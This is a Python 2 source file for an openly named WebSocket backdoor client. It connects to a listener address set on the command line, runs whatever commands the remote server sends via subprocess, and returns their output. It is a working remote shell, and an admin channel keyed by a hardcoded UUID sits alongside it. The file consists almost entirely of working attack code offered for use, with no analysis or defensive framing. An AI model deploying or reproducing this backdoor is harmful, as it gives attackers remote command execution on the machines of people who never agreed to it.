#!/usr/bin/env python
# -*- coding: utf-8 -*-
from ws4py.client.threadedclient import WebSocketClient
import subprocess
import optparse
import os
from clint.packages.colorama.win32 import STDERR

__author__ = "f47h3r - Chase Schultz"

UUID = '6faf6300-7318-11e1-b0c4-0800200c9a66'
users = []

class WSBackdoor(WebSocketClient):
    
    def __execute__(self, cmd, args=None):
            try:
                proc = subprocess.Popen(cmd, shell=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout = proc.stdout.read() + proc.stderr.read()
            except Exception, err:
                stdout = str(err)
                print stdout
            return stdout
    
    def changeDir(self, args):
        path = os.path.abspath(args)
        if os.path.exists(path) and os.path.isdir(path):
            os.chdir(path)
            return True
        else:
            return False
    
    def opened(self):
        self.send("Hello Server! - From Client\n")

    def closed(self, code, reason):
        print "Closed down", code, reason

    def received_message(self, cmd):
        self.cwd = os.getcwd()
        print "Received Message: %s Length: %d" % (str(cmd), len(cmd))
        cmd = str(cmd)
        command = cmd.split()
        if command[0] == 'cd':
            self.changeDir(command[1])
        else:
            print command
            response = self.__execute__(command)
            self.send(response)


class AdminWebsocket(WebSocketClient):
    
    def __ObjectHandler__(self,jsonObject):
        
        pass
    
    
    def opened(self):
        self.send("Hello Server! - From Client Admin Websockets\n")

    def closed(self, code, reason):
        print "Closed down", code, reason

    def received_message(self, jsonObject):
        print 'RECEIVED ON ADMIN INTERFACE:\n\n %s' % str(jsonObject)
        

class jsonObjectProccessor():
    
    def spawnHandler(self):
        pass

    def decodeObject(self, object):
        pass

if __name__ == '__main__':
    usage = __doc__
    author = __author__
    version= "0.01"
    parser = optparse.OptionParser(usage, None, optparse.Option, version)
    parser.add_option('-p',
                      '--port',
                      default='9002',
                      dest='port',
                      help='Listener Port')
    parser.add_option('-l',
                      '--listen',
                      default='127.0.0.1',
                      dest='ip',
                      help='Listener IP address')
    (options, args) = parser.parse_args()
    try:
        adminWebsocket = AdminWebsocket('http://'+options.ip+':'+options.port+'/endpoint/admin/6faf6300-7318-11e1-b0c4-0800200c9a66/', protocols=['http-only', 'chat'])
        adminWebsocket.connect()
        ws = WSBackdoor('http://'+options.ip+':'+options.port+'/endpoint/boxes/box1', protocols=['http-only', 'chat'])
        ws.connect()
    except KeyboardInterrupt:
        ws.close()
